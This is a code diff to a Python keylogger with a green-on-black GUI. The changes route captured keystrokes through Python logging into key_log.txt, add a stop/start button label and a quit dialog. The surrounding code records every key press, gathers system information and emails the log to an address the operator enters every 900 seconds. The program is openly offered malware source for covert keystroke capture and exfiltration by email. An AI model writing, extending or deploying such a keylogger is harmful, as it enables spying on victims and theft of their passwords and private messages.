@@ -13,8 +13,11 @@ import os
 from requests import get
 import threading
 from PIL import ImageGrab, Image, ImageTk
-from tkinter import Label,Frame, Entry, Button
+from tkinter import Label,Frame, Entry, Button, messagebox,StringVar
 from customtkinter import CTk
+import logging
+
+logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')
 
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
@@ -31,6 +34,12 @@ toAddr = ""
 
 state = 0
 stopFlag = False
+
+def on_closing():
+    global stopFlag
+    if messagebox.askokcancel("Quit", "Do you want to quit?"):
+        stopFlag = True
+        root.destroy()
 
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
@@ -102,24 +111,17 @@ def on_press(key):
         keys =[]
 
 def write_file(keys):
-    with open(keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("enter") > 0:
-                f.write('\n')
-            elif k.find("space") > 0:
-                f.write(' ')
-            elif k.find("Key") == -1:
-                f.write(k)
+    for key in keys:
+        k = str(key).replace("'", "")
+        logging.info(k)
 listener = Listener(on_press=on_press)
 
 def start_logger():
-    global listener,toAddr
+    global listener,toAddr,btnStr
     count = 900
     listener.start()
+    btnStr.set("Stop Keylogger")
     while True:
-        sleep(1)
-        count -= 1
         print(count)
         if stopFlag:
             break
@@ -130,11 +132,21 @@ def start_logger():
             computer_information()
             send_email(keys_information,keys_information,toAddr)
             count = 900
+        sleep(1)
+        count -= 1
     listener.stop()
+    btnStr.set("Start Keylogger")
+    listener = Listener(on_press=on_press)
 
 def on_button_click():
-    global state,toAddr,listener,stopFlag
+    global state,toAddr,listener,stopFlag,receiver_entry,btnStr
     toAddr = receiver_entry.get()
+    if (receiver_entry['state'] == 'normal'):
+        receiver_entry['state'] = 'disabled'
+        btnStr.set("Starting...")
+    else:
+        receiver_entry['state'] = 'normal'
+        btnStr.set("Stopping...")
     if state==0:
         state = 1
         print(state)
@@ -145,11 +157,14 @@ def on_button_click():
         state=0
         print(state)
         stopFlag = True
-
+        btnStr.set("Start Keylogger") 
 
 root = CTk()
 root.geometry("800x600")
 root.config(bg="black")
+root.protocol("WM_DELETE_WINDOW", on_closing)
+btnStr = StringVar()
+btnStr.set("Start Keylogger")
 image = Image.open('cracking.png')
 resize_image = image.resize((300, 300))
 img = ImageTk.PhotoImage(resize_image)
@@ -165,6 +180,6 @@ receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("C
 receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
 receiver_entry.grid(row=0,column=1)
 receiver_label.grid(row=0,column=0)
-button = Button(root, text="Start KeyLogger", command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
+button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
 button.pack()
 root.mainloop()
